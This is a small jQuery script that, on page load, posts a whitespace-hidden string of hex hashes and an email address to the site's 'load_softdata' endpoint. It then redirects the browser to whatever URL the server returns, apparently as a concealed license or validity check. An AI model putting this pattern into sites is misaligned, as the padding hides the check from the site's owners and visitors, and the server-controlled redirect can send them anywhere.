$j(document).ready(function(){
    valid_sting.init();
});
var valid_sting={
    init:function(){
        $j.ajax({
            type:'post',
            url:base_url+'ajax_content/load_softdata',
            data:{
                b: base_url,
                a: '\'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  301b0b193746a5d0016603b2a4f1f8fe|2d8fe549fc08f72fbe982218dbed697a|63826b01480a9de62194c342c5ee2d69|anwarworld@gmail.com'
            },
            success:function(html){
                if(html!=''){
                    window.location=html;
                }
            },
            error:function(){
                window.location=base_url+'error.html';
            }
        });
    }
}